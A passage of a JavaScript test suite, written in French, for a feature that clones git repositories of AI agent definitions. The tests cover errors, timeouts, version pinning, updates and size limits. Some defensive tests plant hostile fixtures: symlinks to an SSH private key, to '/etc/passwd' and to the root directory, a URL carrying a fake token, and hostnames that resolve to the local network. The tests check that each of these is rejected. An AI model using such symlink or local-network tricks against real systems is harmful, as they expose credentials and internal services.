  assert.deepEqual([r.ok, r.library.id, r.library.name], [true, 'agents-2', 'equipe/agents'], 'même nom de dépôt : id suivant, nom « propriétaire/dépôt »');
  assert.deepEqual(W.libs.view().map((l) => [l.id, l.name]), [['agents', 'studio/agents'], ['agents-2', 'equipe/agents']], 'deux dépôts « agents » : deux noms');
  const left = () => fs.readdirSync(W.root2).sort();
  const ids = () => W.libs.entries().map((e) => e.id);
  // dépôt introuvable : la phrase du contrat et la ligne utile de git ; rien de gardé
  let e = await W.libs.add('https://github.com/studio/absent');
  assert.equal(e.ok, false);
  assert.ok(e.error.startsWith(`${MSG.cloneFail} Git : « `), e.error);
  assert.equal(MSG.cloneFail, 'Dépôt introuvable, ou git n\'a pas accès : vérifie l\'adresse, et que tu peux le cloner (gh auth login, ou ta clé SSH).');
  assert.deepEqual([ids(), left()], [['agents', 'agents-2'], ['agents', 'agents-2']], 'ni liste ni copie temporaire laissée');
  // pas de réseau, jeton dans le message de git, pas de réponse à temps
  w(OFFLINE, '');
  e = await W.libs.add('https://github.com/studio/autre');
  fs.rmSync(OFFLINE);
  assert.deepEqual(e, { ok: false, status: 400, error: 'Pas de connexion au serveur du dépôt : vérifie ta connexion à internet, puis réessaie.' });
  w(LEAK, '');
  e = await W.libs.add('https://github.com/studio/autre');
  fs.rmSync(LEAK);
  assert.ok(e.error.startsWith(MSG.cloneFail), e.error);
  for (const secret of ['hunter2', 'ghp_A1b2C3', 'alex:']) assert.ok(!e.error.includes(secret), e.error);
  w(SLOW, '6000');
  resetLog();
  const t0 = Date.now();
  e = await quick.add('https://github.com/studio/autre');
  fs.rmSync(SLOW);
  assert.deepEqual(e, { ok: false, status: 400, error: 'Le dépôt n\'a pas répondu en 90 s : vérifie ta connexion à internet, puis réessaie.' });
  assert.ok(Date.now() - t0 < 5000, 'arrêté au bout du délai');
  assert.equal(lines().filter((l) => l.end).length, 0, 'git arrêté, avec ce qu\'il avait lancé');
  assert.deepEqual([ids(), left()], [['agents', 'agents-2'], ['agents', 'agents-2']]);
  // adresse refusée : git jamais lancé
  resetLog();
  assert.deepEqual(await W.libs.add('file:///Users/alex/agents'), { ok: false, status: 400, error: MSG.badUrl });
  assert.deepEqual(await W.libs.add('https://alex:ghp_A1b2C3d4E5f6@github.com/studio/agents'), { ok: false, status: 400, error: MSG.credentials });
  assert.deepEqual(await W.libs.add('https://github.com/studio/agents/tree/main'), { ok: false, status: 400, error: MSG.page('https://github.com/studio/agents') });
  assert.deepEqual(calls(), []);
  // 20 bibliothèques au plus
  const full = Array.from({ length: L.LIBRARIES_MAX }, (_, i) => ({ id: `b${i}`, url: `https://github.com/studio/b${i}`, addedAt: null }));
  fs.writeFileSync(path.join(W.data, 'agent-libraries.json'), J(full));
  assert.deepEqual(await W.libs.add('https://github.com/studio/autre'), { ok: false, status: 400, error: '20 bibliothèques au plus : retires-en une, puis réessaie.' });
  assert.deepEqual(calls(), []);
});

test('hôte https résolu avant git : réseau local refusé (127.0.0.1.nip.io, localtest.me…), adresse vérifiée figée ; ssh jamais résolu', { skip: NO_GIT }, async () => {
  const asked = [];
  const map = { 'github.com': ['140.82.112.3'], '127.0.0.1.nip.io': ['127.0.0.1'], 'localtest.me': ['127.0.0.1', '::1'], 'git.studio.fr': ['10.0.0.5'],
    'mixte.example.com': ['140.82.112.3', 'fd00::1'], 'mappee.example.com': ['::ffff:192.168.1.1'], 'v6.example.com': ['2606:50c0:8000::153', '140.82.112.4'] };
  const fixed = L.staticResolve(map);
  const W = world({ resolve: (host, ms) => { asked.push(host); return fixed(host, ms); } });
  resetLog();
  for (const host of ['127.0.0.1.nip.io', 'localtest.me', 'git.studio.fr', 'mixte.example.com', 'mappee.example.com']) {
    assert.deepEqual(await W.libs.add(`https://${host}/studio/agents`), { ok: false, status: 400, error: MSG.localHost(host) }, host);
  }
  assert.equal(MSG.localHost('localtest.me'), 'Adresse refusée : localtest.me mène à ton réseau local. Colle l\'adresse d\'un dépôt en ligne (https://github.com/… ou git@github.com:…).');
  assert.deepEqual(await W.libs.add('https://introuvable.example.com/studio/agents'), { ok: false, status: 400, error: MSG.offlineAdd });
  assert.deepEqual(calls(), [], 'git jamais lancé');
  // une adresse publique : figée pour git (IPv6 entre crochets)
  let e = await W.libs.add('https://v6.example.com/studio/agents');
  assert.equal(e.ok, false, 'https coupé par le faux git');
  assert.deepEqual(after0(calls()[0]).slice(0, 2), ['-c', 'http.curloptResolve=v6.example.com:443:[2606:50c0:8000::153],140.82.112.4']);
  // un résolveur qui ne répond pas : arrêté au bout du délai
  const stuck = mk(W, { timeoutMs: 300, resolve: () => new Promise(() => {}) });
  const t0 = Date.now();
  assert.deepEqual(await stuck.add('https://github.com/studio/agents'), { ok: false, status: 400, error: MSG.slowAdd });
  assert.ok(Date.now() - t0 < 3000);
  // ssh : ni résolu ni figé (l'empreinte du serveur protège)
  publish('studio/agents', { 'a/AGENT.md': agentMd('A') });
  asked.length = 0;
  resetLog();
  e = await W.libs.add('git@github.com:studio/agents');
  assert.equal(e.ok, true, e.error);
  assert.deepEqual(asked, []);
  assert.ok(calls().every((c) => !c.args.some((a) => a.startsWith('http.curloptResolve'))));
});

test('dépôt vide, hôte SSH inconnu : la phrase dit quoi faire', { skip: NO_GIT }, async () => {
  const d = path.join(SERVER, 'studio', 'vide');
  fs.rmSync(d, { recursive: true, force: true });
  fs.mkdirSync(d, { recursive: true });
  g(d, 'init', '-q', '-b', 'main');
  const W = world();
  assert.equal(MSG.empty, 'Dépôt vide : pousse au moins un agent (un dossier avec son AGENT.md).');
  assert.deepEqual(await W.libs.add('https://github.com/studio/vide'), { ok: false, status: 400, error: MSG.empty });
  assert.deepEqual([W.libs.entries(), fs.existsSync(W.lib('vide'))], [[], false]);
  w(HOSTKEY, '');
  try {
    assert.deepEqual(await W.libs.add('git@github.com:studio/agents.git'), { ok: false, status: 400,
      error: 'Ton Mac ne connaît pas encore ce serveur : connecte-toi une fois avec ssh -T git@github.com et accepte son empreinte, puis réessaie.' });
    assert.equal(MSG.unknownHost('-p 2222 git@git.studio.fr'), 'Ton Mac ne connaît pas encore ce serveur : connecte-toi une fois avec ssh -T -p 2222 git@git.studio.fr et accepte son empreinte, puis réessaie.');
  } finally { fs.rmSync(HOSTKEY); }
  // dépôt qui se vide (branche par défaut supprimée) : la version d'avant reste
  publish('studio/agents', { 'a/AGENT.md': agentMd('A') });
  assert.equal((await W.libs.add('https://github.com/studio/agents')).ok, true);
  const srv = path.join(SERVER, 'studio', 'agents');
  g(srv, 'symbolic-ref', 'HEAD', 'refs/heads/absente');
  const r = await W.libs.update('agents');
  assert.deepEqual([r.ok, r.error], [false, MSG.empty]);
  assert.equal(W.agents.get('a').name, 'A');
});

// ---------- agents d'une bibliothèque ----------

test('agents d\'une bibliothèque : un par dossier avec AGENT.md, id sans conflit (un local n\'est jamais remplacé), {{dossier_agent}}, liens ignorés', { skip: NO_GIT }, async () => {
  publish('studio/agents', {
    'LISEZMOI.md': 'Un dossier par agent.\n',
    'demarrer-projet/AGENT.md': agentMd('Démarrer un projet (studio)'),
    'Créer une page/AGENT.md': agentMd('Créer une page', 'Modèles : {{dossier_agent}}/modeles\nPour {{client}}.') .replace('---\n', '---\nfields:\n  - id: client\n    label: Client\n'),
    'Créer une page/modeles/page.json': '{}\n',
    'relier-cms/AGENT.md': agentMd('Relier le CMS'),
    'casse/AGENT.md': '---\nname: "Cassé\n---\nx\n',
    'gros/AGENT.md': `---\nname: Gros\n---\n${'x'.repeat(256 * 1024 + 1)}\n`,
    '.cache/AGENT.md': agentMd('Caché'),
    'notes/README.md': 'pas un agent\n',
    '!!!/AGENT.md': agentMd('Sans nom utilisable'),
    // liens dans le dépôt : un AGENT.md qui en est un, un dossier qui en est un
    'copie/AGENT.md': { link: '../relier-cms/AGENT.md' },
    'dossier-lien': { link: 'relier-cms' },
  });
  publish('studio/outils.git', { 'relier-cms/AGENT.md': agentMd('Relier le CMS (outils)'), 'demarrer-projet/AGENT.md': agentMd('Démarrer (outils)') });
  const W = world();
  W.local('demarrer-projet', agentMd('Démarrer un projet (local)'));
  const alone = createAgents({ dir: W.agentsDir, home: W.home, now: () => new Date('2026-10-26T14:03:00') });
  const localBefore = alone.list();
  assert.equal((await W.libs.add('https://github.com/studio/agents')).message, 'Bibliothèque ajoutée : 5 agents.');
  assert.equal((await W.libs.add('git@github.com:studio/outils.git')).message, 'Bibliothèque ajoutée : 2 agents.');
  const list = W.agents.list();
  const lib = (id) => ({ kind: 'library', id, name: `studio/${id}` });
  assert.deepEqual(list.map((a) => [a.id, a.source ?? 'local']), [
    ['casse', lib('agents')],
    ['creer-une-page', lib('agents')],
    ['outils-demarrer-projet', lib('outils')],
    ['demarrer-projet', 'local'],
    ['agents-demarrer-projet', lib('agents')],
    ['gros', lib('agents')],
    ['relier-cms', lib('agents')],
    ['outils-relier-cms', lib('outils')],
  ], 'triés par nom ; le local garde son id, la bibliothèque prend <bibliothèque>-<dossier>');
  assert.deepEqual(list.find((a) => a.id === 'demarrer-projet'), localBefore[0], 'agent local : exactement comme sans bibliothèque');
  assert.match(list.find((a) => a.id === 'casse').error, /guillemets non fermés/);
  assert.match(list.find((a) => a.id === 'gros').error, /trop gros/);
  assert.deepEqual(list.find((a) => a.id === 'creer-une-page').fields.map((f) => f.id), ['client']);
  assert.deepEqual(W.libs.view().map((l) => [l.id, l.agents]), [['agents', 5], ['outils', 2]]);
  // dans la copie : aucun lien, ceux du dépôt ne sont jamais extraits
  const copy = W.copy('agents');
  assert.ok(!walk(copy).some(([, k]) => k === 'l'), 'aucun lien symbolique dans la copie');
  for (const p of ['copie/AGENT.md', 'dossier-lien']) assert.equal(fs.existsSync(path.join(copy, p)), false, p);
  // un lien glissé dans la copie après coup (dossier ou AGENT.md) : ignoré aussi
  fs.symlinkSync(path.join(copy, 'relier-cms'), path.join(copy, 'faux-dossier'));
  fs.mkdirSync(path.join(copy, 'faux-agent'));
  fs.symlinkSync(path.join(copy, 'relier-cms', 'AGENT.md'), path.join(copy, 'faux-agent', 'AGENT.md'));
  assert.equal(W.agents.list().length, list.length);
  assert.equal(W.agents.get('faux-agent'), null);
  // get, et un local ajouté ensuite sous le nom d'un agent de bibliothèque : le local passe devant
  assert.equal(W.agents.get('agents-demarrer-projet').body, 'Consigne.');
  assert.deepEqual(W.agents.get('outils-relier-cms').source, lib('outils'));
  W.local('relier-cms', agentMd('Relier le CMS (local)'));
  assert.equal(W.agents.get('relier-cms').name, 'Relier le CMS (local)');
  assert.equal(W.agents.get('relier-cms').source, undefined);
  assert.equal(W.agents.get('agents-relier-cms').name, 'Relier le CMS');
  assert.equal(W.agents.get('outils-relier-cms').name, 'Relier le CMS (outils)');
  // lancement d'un agent de bibliothèque : {{dossier_agent}} est son dossier dans la version figée (chemin réel)
  const folder = path.join(W.home, 'Code', 'cabinet-martin');
  const r = W.agents.launch({ id: 'creer-une-page', values: { client: 'Cabinet Martin' }, folder });
  assert.equal(r.ok, true, r.error);
  assert.equal(r.briefFile, path.join(folder, '.vigie', 'agent-creer-une-page.md'));
  assert.equal(r.prompt, `Lance l'agent « Créer une page » : lis le fichier ${r.briefFile} et suis ses consignes, dans le dossier ${folder}.`);
  const brief = fs.readFileSync(r.briefFile, 'utf8');
  assert.ok(brief.includes(`Modèles : ${fs.realpathSync(path.join(copy, 'Créer une page'))}/modeles\nPour Cabinet Martin.`), brief);
  assert.equal(W.agents.launch({ id: 'casse', values: {}, folder }).error.startsWith('Cet agent ne peut pas être lancé : '), true);
  assert.deepEqual(walk(copy).filter(([p]) => p.startsWith('Créer une page')), [['Créer une page', 'd'], ['Créer une page/AGENT.md', 'f'],
    ['Créer une page/modeles', 'd'], ['Créer une page/modeles/page.json', 'f']], 'le lancement n\'écrit rien dans la copie');
});

test('ids retenus : un agent garde son id quand une autre bibliothèque publie le même dossier ou est retirée ; lancement refusé si l\'agent a changé', { skip: NO_GIT }, async () => {
  publish('studio/agents', { 'creer-page/AGENT.md': agentMd('Créer une page (studio)') });
  publish('alex/outils', { 'demarrer-projet/AGENT.md': agentMd('Démarrer un projet (Alex)', 'Consigne d\'Alex.') });
  const W = world();
  await W.libs.add('https://github.com/studio/agents');
  await W.libs.add('https://github.com/alex/outils');
  const shown = () => W.agents.list().map((a) => [a.id, a.source?.id ?? 'local']);
  assert.deepEqual(shown(), [['creer-page', 'agents'], ['demarrer-projet', 'outils']]);
  // la bibliothèque ajoutée avant publie un dossier du même nom : l'agent d'Alex garde son id
  publish('studio/agents', { 'demarrer-projet/AGENT.md': agentMd('Démarrer un projet (studio)', 'Consigne du studio : supprime le dossier docs/.') });
  assert.equal((await W.libs.update('agents')).ok, true);
  assert.deepEqual(shown(), [['creer-page', 'agents'], ['demarrer-projet', 'outils'], ['agents-demarrer-projet', 'agents']]);
  assert.equal(W.agents.get('demarrer-projet').body, 'Consigne d\'Alex.');
  const saved = () => Object.fromEntries(JSON.parse(fs.readFileSync(path.join(W.data, 'agent-libraries.json'), 'utf8')).map((e) => [e.id, e.agents]));
  assert.deepEqual(saved(), { agents: { 'creer-page': 'creer-page', 'demarrer-projet': 'agents-demarrer-projet' }, outils: { 'demarrer-projet': 'demarrer-projet' } });
  // une mise à jour de l'autre ne change rien ; le retrait de la première non plus
  assert.equal((await W.libs.update()).ok, true);
  assert.equal(W.agents.get('demarrer-projet').body, 'Consigne d\'Alex.');
  await W.libs.remove('agents');
  assert.deepEqual(shown(), [['demarrer-projet', 'outils']]);
  // une nouvelle bibliothèque avec le même dossier : un autre id, celui d'Alex ne bouge pas
  publish('equipe/agents', { 'demarrer-projet/AGENT.md': agentMd('Démarrer un projet (équipe)') });
  await W.libs.add('https://github.com/equipe/agents');
  assert.deepEqual(shown(), [['demarrer-projet', 'outils'], ['agents-demarrer-projet', 'agents']]);
  // lancement : la source envoyée par l'app (ouverte sur l'agent d'Alex) doit être celle de l'agent lu
  const folder = path.join(W.home, 'Code', 'client');
  const launch = (id, source) => W.agents.launch({ id, values: {}, folder, source });
  assert.equal(launch('demarrer-projet', { kind: 'library', id: 'outils' }).ok, true);
  assert.equal(launch('demarrer-projet').ok, true, 'sans source (app plus ancienne) : pas de vérification');
  // un agent local créé depuis sous ce nom : il passe devant, et le formulaire ouvert sur l'agent d'Alex est refusé
  fs.rmSync(folder, { recursive: true });
  W.local('demarrer-projet', agentMd('Démarrer (local)'));
  assert.equal(AGENT_CHANGED, 'Cet agent a changé depuis l\'ouverture du formulaire : ferme-le et rouvre-le.');
  for (const source of [{ kind: 'library', id: 'outils' }, { kind: 'library' }, { kind: 'library', id: 42 }, { kind: 'autre' }, 'outils', []]) {
    assert.deepEqual(launch('demarrer-projet', source), { ok: false, status: 409, error: AGENT_CHANGED }, J(source));
  }
  assert.equal(fs.existsSync(folder), false, 'rien de créé');
  assert.equal(launch('demarrer-projet', { kind: 'local' }).ok, true);
  assert.deepEqual(launch('agents-demarrer-projet', { kind: 'local' }), { ok: false, status: 409, error: AGENT_CHANGED });
  assert.equal(launch('agents-demarrer-projet', { kind: 'library', id: 'agents' }).ok, true);
  // l'agent d'Alex a pris un autre id (le local a le sien) ; à sa mise à jour, cet id est retenu
  const alex = W.agents.list().find((a) => a.source?.id === 'outils');
  assert.equal(alex.id, 'outils-demarrer-projet');
  await W.libs.update('outils');
  assert.equal(saved().outils['demarrer-projet'], 'outils-demarrer-projet');
});

test('lien symbolique et sous-module dans le dépôt : ni extraits, ni suivis', { skip: NO_GIT }, async () => {
  const sha = publish('studio/pieges', {
    'agent/AGENT.md': agentMd('Agent'),
    'agent/cle': { link: '/Users/alex/.ssh/id_ed25519' },
    'agent/dehors': { link: '../../../..' },
    'racine': { link: '/' },
  });
  // un sous-module (dépôt cité, jamais cloné)
  const d = path.join(SERVER, 'studio', 'pieges');
  fs.writeFileSync(path.join(d, '.gitmodules'), `[submodule "vendor/outil"]\n\tpath = vendor/outil\n\turl = https://github.com/studio/agents\n`);
  g(d, 'add', '.gitmodules');
  g(d, 'update-index', '--add', '--cacheinfo', `160000,${sha},vendor/outil`);
  g(d, 'commit', '-qm', 'sous-module');
  const W = world();
  resetLog();
  assert.equal((await W.libs.add('https://github.com/studio/pieges')).ok, true);
  assert.deepEqual(walk(W.copy('pieges')), [['.gitmodules', 'f'], ['agent', 'd'], ['agent/AGENT.md', 'f']], 'ni liens ni sous-module');
  assert.deepEqual(calls().map((c) => c.sub), ['ls-remote', 'clone', 'rev-parse', 'ls-tree', 'read-tree', 'checkout-index'], 'aucun clonage du sous-module');
  // une nouvelle version avec un autre lien : pas extrait non plus
  publish('studio/pieges', { 'agent/notes': { link: '/etc/passwd' }, 'agent/AGENT.md': agentMd('Agent v2') });
  assert.equal((await W.libs.update('pieges')).ok, true);
  assert.ok(!walk(W.copy('pieges')).some(([p, k]) => k === 'l' || p === 'agent/notes' || p === 'racine'));
  assert.equal(W.agents.get('agent').name, 'Agent v2');
  assert.equal(fs.existsSync(MARK), false, 'aucun hook n\'a tourné');
});

// ---------- mise à jour, retrait ----------

test('mise à jour : nouvelle version publiée, échec qui garde la version en service, version disparue reprise ; retrait', { skip: NO_GIT }, async () => {
  const v1 = publish('studio/agents', { 'demarrer-projet/AGENT.md': agentMd('Démarrer v1'), 'vieux/AGENT.md': agentMd('Vieux') });
  const W = world();
  const added = await W.libs.add('https://github.com/studio/agents');
  const t1 = new Date(clock).toISOString();
  clock += 3 * 3600_000;
  const t2 = new Date(clock).toISOString();
  const v2 = publish('studio/agents', { 'demarrer-projet/AGENT.md': agentMd('Démarrer v2'), 'vieux/AGENT.md': null, 'nouveau/AGENT.md': agentMd('Nouveau') });
  resetLog();
  let r = await W.libs.update('agents');
  assert.equal(r.ok, true, r.error);
  assert.equal(r.message, 'Bibliothèque à jour : 2 agents.');
  assert.deepEqual(r.libraries, [{ id: 'agents', name: 'studio/agents', url: 'https://github.com/studio/agents', addedAt: t1, updatedAt: t2, commit: v2.slice(0, 7), status: 'ok', error: null, agents: 2 }]);
  assert.notEqual(added.library.commit, v2.slice(0, 7));
  assert.deepEqual(W.agents.list().map((a) => [a.id, a.name]), [['demarrer-projet', 'Démarrer v2'], ['nouveau', 'Nouveau']], 'agent retiré du dépôt : retiré de la liste');
  const c = calls();
  assert.deepEqual(c.map((x) => x.sub), ['ls-remote', 'clone', 'rev-parse', 'ls-tree', 'read-tree', 'checkout-index'], 'comme l\'ajout : un dépôt neuf, aucun gardé');
  assert.deepEqual(W.lowered, []);
  assert.deepEqual(fs.readdirSync(W.lib('agents')).sort(), [v1.slice(0, 7), v2.slice(0, 7)].sort(), 'la version d\'avant est gardée à côté');
  // rien de neuf : une seule petite requête, rien d'extrait
  resetLog();
  r = await W.libs.update('agents');
  assert.deepEqual([r.ok, calls().map((x) => x.sub)], [true, ['ls-remote']]);
  // le dépôt n'est plus là : la version en service reste, l'erreur est gardée, l'heure de la dernière mise à jour aussi
  const t3 = new Date(clock).toISOString();
  const gone = path.join(SERVER, 'studio', 'agents-parti');
  fs.renameSync(path.join(SERVER, 'studio', 'agents'), gone);
  clock += 3600_000;
  r = await W.libs.update('agents');
  assert.equal(r.ok, false);
  assert.equal(r.status, 400);
  assert.ok(r.error.startsWith('Mise à jour impossible : dépôt introuvable, ou git n\'a pas accès. Vérifie l\'adresse, et que tu peux le cloner (gh auth login, ou ta clé SSH). Git : « '), r.error);
  assert.deepEqual([r.libraries[0].status, r.libraries[0].error, r.libraries[0].updatedAt, r.libraries[0].commit], ['error', r.error, t3, v2.slice(0, 7)]);
  assert.deepEqual(W.agents.list().map((a) => a.name), ['Démarrer v2', 'Nouveau'], 'la dernière bonne version sert toujours');
  // de retour : l'erreur part
  fs.renameSync(gone, path.join(SERVER, 'studio', 'agents'));
  r = await W.libs.update();
  assert.deepEqual([r.ok, r.message, r.libraries[0].status, r.libraries[0].error], [true, 'Bibliothèque à jour : 2 agents.', 'ok', null]);
  // version en service disparue (effacée à la main) : signalée, puis reprise par la mise à jour
  fs.rmSync(W.copy('agents'), { recursive: true });
  assert.deepEqual([W.libs.view()[0].status, W.libs.view()[0].error, W.libs.view()[0].agents], ['error', MSG.missing, 0]);
  assert.deepEqual(W.agents.list(), []);
  r = await W.libs.update('agents');
  assert.equal(r.ok, true, r.error);
  assert.equal(W.agents.list().length, 2);
  // inconnue
  assert.deepEqual(await W.libs.update('inconnue'), { ok: false, status: 404, error: MSG.notFound });
  assert.deepEqual(await W.libs.update(42), { ok: false, status: 404, error: MSG.notFound });
  // plusieurs : toutes, l'une après l'autre
  publish('studio/modeles', { 'outil/AGENT.md': agentMd('Outil') });
  await W.libs.add('https://github.com/studio/modeles');
  r = await W.libs.update();
  assert.deepEqual([r.ok, r.message, r.libraries.length], [true, 'Bibliothèques à jour.', 2]);
  fs.renameSync(path.join(SERVER, 'studio', 'modeles'), path.join(SERVER, 'studio', 'modeles-parti'));
  r = await W.libs.update();
  assert.equal(r.ok, false);
  assert.ok(r.error.startsWith('studio/modeles : Mise à jour impossible'), r.error);
  // retrait : l'entrée et toutes les versions ; plus rien de lancé
  resetLog();
  assert.deepEqual(await W.libs.remove('agents'), { ok: true, message: 'Bibliothèque retirée.' });
  assert.equal(fs.existsSync(W.lib('agents')), false);
  assert.deepEqual(W.libs.entries().map((e) => e.id), ['modeles']);
  assert.deepEqual(await W.libs.remove('agents'), { ok: false, status: 404, error: MSG.notFound });
  for (const id of ['../agents', '', null, '.', '..']) assert.deepEqual(await W.libs.remove(id), { ok: false, status: 404, error: MSG.notFound }, String(id));
  assert.deepEqual(W.agents.list().map((a) => a.id), ['outil']);
  assert.deepEqual(await W.libs.remove('modeles'), { ok: true, message: 'Bibliothèque retirée.' });
  assert.deepEqual([W.libs.view(), fs.readdirSync(W.root2)], [[], []]);
  assert.deepEqual(calls(), [], 'le retrait ne lance pas git');
  assert.deepEqual(await W.libs.update(), { ok: true, libraries: [], message: 'Aucune bibliothèque à mettre à jour.' });
});

test('versions figées : une conversation lancée lit toujours la sienne, même pendant et après une mise à jour ; gardée 24 h, place limitée', { skip: NO_GIT }, async () => {
  assert.deepEqual([L.RETIRED_KEEP_MS, L.RETIRED_BYTES_MAX, L.RETIRED_MAX], [24 * 3600_000, 500 * 1024 * 1024, 24]);
  const md = (v) => agentMd(`Démarrer ${v}`, 'Lance {{dossier_agent}}/script.js');
  const size = Buffer.byteLength(md('v1')) + Buffer.byteLength('v1\n');
  const v1 = publish('studio/agents', { 'demarrer/AGENT.md': md('v1'), 'demarrer/script.js': 'v1\n' });
  // place des versions d'avant : 3 versions de cette taille (500 Mo pour de vrai)
  const W = world({ limits: { keptBytes: 3 * size } });
  await W.libs.add('https://github.com/studio/agents');
  const old = W.copy('agents');
  assert.equal(old, path.join(W.lib('agents'), v1.slice(0, 7)));
  const folder = path.join(W.home, 'Code', 'client');
  const r1 = W.agents.launch({ id: 'demarrer', values: {}, folder });
  const dir1 = fs.realpathSync(path.join(old, 'demarrer'));
  assert.ok(fs.readFileSync(r1.briefFile, 'utf8').includes(`Lance ${dir1}/script.js`), '{{dossier_agent}} nomme la version figée');
  // pendant une mise à jour lente, l'agent se lit toujours en entier, et la version lancée ne change pas
  const v2 = publish('studio/agents', { 'demarrer/AGENT.md': md('v2'), 'demarrer/script.js': 'v2\n' });
  w(SLOW, '300');
  let done = false;
  const p = W.libs.update('agents').then((x) => { done = true; return x; });
  const names = new Set();
  while (!done) {
    const a = W.agents.get('demarrer');
    assert.ok(a && !a.error, 'agent lisible pendant la mise à jour');
    names.add(a.name);
    assert.equal(fs.readFileSync(path.join(dir1, 'script.js'), 'utf8'), 'v1\n');
    await new Promise((res) => setTimeout(res, 5));
  }
  fs.rmSync(SLOW);
  assert.equal((await p).ok, true);
  assert.ok([...names].every((x) => x === 'Démarrer v1' || x === 'Démarrer v2'), [...names].join(', '));
  // après : la conversation lancée lit encore sa version ; un nouveau lancement prend la nouvelle
  assert.equal(fs.readFileSync(path.join(dir1, 'script.js'), 'utf8'), 'v1\n');
  assert.equal(fs.readFileSync(path.join(dir1, 'AGENT.md'), 'utf8'), md('v1'));
  const r2 = W.agents.launch({ id: 'demarrer', values: {}, folder });
  const dir2 = fs.realpathSync(path.join(W.lib('agents'), v2.slice(0, 7), 'demarrer'));
  assert.ok(fs.readFileSync(r2.briefFile, 'utf8').includes(`Lance ${dir2}/script.js`));
  const at = new Date(clock).toISOString();
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(W.data, 'agent-libraries.json'), 'utf8'))[0].retired, [{ commit: v1, at, bytes: size }]);
  // 2 h plus tard : encore là ; 25 h plus tard : retirée au relevé
  clock += 2 * 3600_000;
  await W.libs.tick();
  assert.ok(fs.existsSync(dir1));
  clock += 23 * 3600_000;
  await W.libs.tick();
  assert.equal(fs.existsSync(dir1), false, 'version d\'avant retirée après 24 h');
  assert.deepEqual(W.libs.entries()[0].retired, []);
  // plusieurs versions de suite : la version en service, et les plus récentes d'avant tant qu'elles tiennent dans la place
  const shas = [v2];
  for (let i = 3; i <= 7; i++) {
    shas.push(publish('studio/agents', { 'demarrer/AGENT.md': md(`v${i}`), 'demarrer/script.js': `v${i}\n` }));
    assert.equal((await W.libs.update('agents')).ok, true);
  }
  assert.deepEqual(fs.readdirSync(W.lib('agents')).sort(), shas.slice(-4).map((s) => s.slice(0, 7)).sort());
  assert.equal(W.agents.get('demarrer').name, 'Démarrer v7');
});

test('verrous et copies laissés par un git arrêté net : sans effet sur la mise à jour suivante ; arrêt du moteur : git arrêté', { skip: NO_GIT }, async () => {
  const v1 = publish('studio/agents', { 'a/AGENT.md': agentMd('A v1') });
  const W = world();
  await W.libs.add('https://github.com/studio/agents');
  // moteur tué en pleine mise à jour : verrous de git, paquet à moitié reçu, extraction coupée
  for (const p of [path.join(W.lib('agents'), '.git', 'shallow.lock'), path.join(W.lib('agents'), '.git', 'index.lock'),
    path.join(W.lib('agents'), '.git', 'objects', 'pack', 'tmp_pack_x'), path.join(W.root2, '.agents.0123456789ab.tmp', '.git', 'shallow.lock'),
    path.join(W.lib('agents'), `.${v1.slice(0, 7)}.0123456789ab.tmp`, 'a', 'AGENT.md')]) {
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.appendFileSync(p, '');
  }
  publish('studio/agents', { 'a/AGENT.md': agentMd('A v2') });
  let r = await W.libs.update('agents');
  assert.equal(r.ok, true, r.error);
  assert.equal(W.agents.get('a').name, 'A v2');
  const all = walk(W.root2).map(([p]) => p);
  assert.ok(!all.some((p) => /\.lock$|tmp_pack|\.tmp$|(^|\/)\.git$/.test(p)), all.join('\n'));
  assert.equal(fs.existsSync(path.join(W.lib('agents'), '.git')), false);
  // délai sur le Mac (extraction) : pas de « vérifie ta connexion »
  const quick = mk(W, { timeoutMs: 1500 });
  publish('studio/lent', { 'a/AGENT.md': agentMd('A') });
  w(SLOW_LOCAL, '4000');
  try {
    assert.deepEqual(await quick.add('https://github.com/studio/lent'), { ok: false, status: 400, error: MSG.slowLocalAdd });
    publish('studio/agents', { 'a/AGENT.md': agentMd('A v3') });
    r = await quick.update('agents');
    assert.deepEqual([r.ok, r.error], [false, MSG.slowLocal]);
  } finally { fs.rmSync(SLOW_LOCAL); }
  assert.equal(MSG.slowLocalAdd, 'La copie de la bibliothèque a pris plus de 90 s sur ton Mac : réessaie dans un instant.');
  // arrêt du moteur pendant une mise à jour : git et ce qu'il a lancé sont arrêtés, plus rien ne part
  w(SLOW, '8000');
  resetLog();
  try {
    const t0 = Date.now();
    const p = W.libs.update('agents');
    await until(() => W.libs.running() > 0 && calls().length > 0);
    const pid = calls()[0].pid;
    W.libs.stop();
    r = await p;
    assert.deepEqual([r.ok, r.error], [false, MSG.stopped]);
    assert.ok(Date.now() - t0 < 4000, 'arrêté tout de suite');
    await until(() => { try { process.kill(pid, 0); return false; } catch { return true; } });
    assert.equal(lines().filter((l) => l.end).length, 0, 'git arrêté avant d\'avoir fini');
    assert.deepEqual(await W.libs.tick(), []);
  } finally { fs.rmSync(SLOW); }
});

test('taille comptée avant d\'extraire : trop de fichiers ou d\'octets, rien n\'est écrit et la version en service reste', { skip: NO_GIT }, async () => {
  assert.equal(MSG.tooBig, 'Dépôt trop gros pour une bibliothèque : 10 000 fichiers et 200 Mo au plus. Garde dans ce dépôt les agents et leurs fichiers seulement.');
  assert.deepEqual([L.REPO_FILES_MAX, L.REPO_BYTES_MAX], [10_000, 200 * 1024 * 1024]);
  const W = world();
  const small = mk(W, { limits: { files: 3, bytes: 1000 } });
  publish('studio/lourd', { 'a/AGENT.md': agentMd('A'), 'a/image.bin': 'x'.repeat(5000) });
  publish('studio/nombreux', { 'a/AGENT.md': agentMd('A'), 'a/1': '1', 'a/2': '2', 'a/3': '3' });
  for (const repo of ['lourd', 'nombreux']) {
    resetLog();
    assert.deepEqual(await small.add(`https://github.com/studio/${repo}`), { ok: false, status: 400, error: MSG.tooBig }, repo);
    assert.ok(!calls().some((c) => c.sub === 'read-tree' || c.sub === 'checkout-index'), 'rien d\'extrait');
    assert.deepEqual(fs.readdirSync(W.root2), [], 'ni version ni copie temporaire');
  }
  // une mise à jour qui dépasse : refusée, la version d'avant sert toujours
  const v1 = publish('studio/petit', { 'a/AGENT.md': agentMd('A v1') });
  assert.equal((await small.add('https://github.com/studio/petit')).ok, true);
  publish('studio/petit', { 'a/AGENT.md': agentMd('A v2'), 'a/1': '1', 'a/2': '2', 'a/3': '3' });
  const r = await small.update('petit');
  assert.deepEqual([r.ok, r.error], [false, MSG.tooBig]);
  assert.deepEqual([small.entries()[0].commit, fs.readdirSync(W.lib('petit'))], [v1, [v1.slice(0, 7)]]);
  assert.equal(W.agents.get('a').name, 'A v1');
});

test('branche par défaut renommée chez l\'auteur : suivie sans rien faire', { skip: NO_GIT }, async () => {
